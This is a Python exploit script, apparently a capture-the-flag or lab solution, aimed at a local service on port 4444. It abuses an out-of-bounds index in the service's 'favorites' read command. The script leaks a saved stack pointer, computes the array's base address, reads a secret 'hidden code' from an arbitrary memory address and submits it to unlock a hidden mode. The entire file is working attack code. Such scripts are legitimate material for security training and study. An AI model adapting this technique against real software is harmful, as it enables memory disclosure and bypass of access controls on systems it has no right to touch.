from util import *
from environment import *

s = Socket("127.0.0.1", 4444)

HIDDEN_CODE_ADDRESS = 0x2330AC
OFFSET_FAVORITES_TO_STACK_PUSHED_EBP = 0x40
OFFSET_EBP_TO_FAVORITES = 0x98


def cmd():
    return s.recvuntil(b"cmd: ")


def send_n(n: int):
    s.send(f"{n}\r\n".encode("utf-8"))


def input_number(n: int):
    s.recvuntil(b"Input number (1-10): ")
    send_n(n)


def read_mem(address: int, favorites_address: int):
    send_n(3)
    s.recvuntil(b"What number do you want to read? (You can choose 1 to 10)")
    send_n((address - favorites_address) // 4 + 1)
    msg = s.recvuntil(b"\n").decode("utf-8")
    num = msg.split("is")[1].strip()
    return int(num)


def read_mem_by_offset(bytes_offset: int):
    send_n(3)
    s.recvuntil(b"What number do you want to read? (You can choose 1 to 10)")
    send_n(bytes_offset // 4 + 1)
    msg = s.recvuntil(b"\n").decode("utf-8")
    num = msg.split("is")[1].strip()
    return int(num)


def enter_hidden_mode(hidden_code: int):
    send_n(1)
    s.recvuntil(b"hidden code: ")
    send_n(hidden_code)
    msg = s.recvuntil(b"\n")
    print(msg)


def main():
    s.connect()
    cmd()

    ebp = read_mem_by_offset(OFFSET_FAVORITES_TO_STACK_PUSHED_EBP)
    print(f"ebp: {hex(ebp)}")
    favorites_address = ebp - OFFSET_EBP_TO_FAVORITES
    print(f"favorites base: {hex(favorites_address)}")

    cmd()
    hidden_code = read_mem(HIDDEN_CODE_ADDRESS, favorites_address)
    print(f"hiddenCode: {hex(hidden_code)}")

    cmd()
    enter_hidden_mode(hidden_code)


if __name__ == "__main__":
    main()
